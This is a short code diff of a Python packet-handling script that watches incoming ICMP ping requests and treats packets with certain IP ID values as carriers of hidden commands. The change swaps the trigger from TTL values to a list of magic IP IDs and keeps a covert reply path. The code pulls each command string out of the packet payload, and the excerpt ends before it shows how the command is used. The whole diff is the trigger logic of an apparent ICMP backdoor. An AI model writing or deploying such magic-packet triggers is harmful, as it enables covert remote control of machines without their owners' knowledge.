@@ -12,16 +12,17 @@ def process_packet(packet):
     pkt = IP(packet.get_payload())  # Convert to scapy packet
     if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:  # ICMP Echo Request (ping)
         print(f"Ping request from {pkt[IP].src}")
+        print(f"ID: {pkt[IP].id}")
 
         payload = None
         if(pkt.haslayer(Raw)):
             payload = pkt[Raw].load
         try:
-            SEND_REPLY = "0" in popen("sysctl -q net.ipv4.icmp_echo_ignore_all").read() or pkt[IP].ttl == 31
+            SEND_REPLY = "0" in popen("sysctl -q net.ipv4.icmp_echo_ignore_all").read() or pkt[IP].id == 31
         except: 
             SEND_REPLY = True
 
-        if(pkt[IP].ttl in [45, 65, 31, 17]):
+        if(pkt[IP].id in [6571, 8796, 1234, 2222, 9876, 1337]):
             print("Malicious packet found")
             command = str(payload)[2:-1]
             print(f"Command: \"{command}\"")
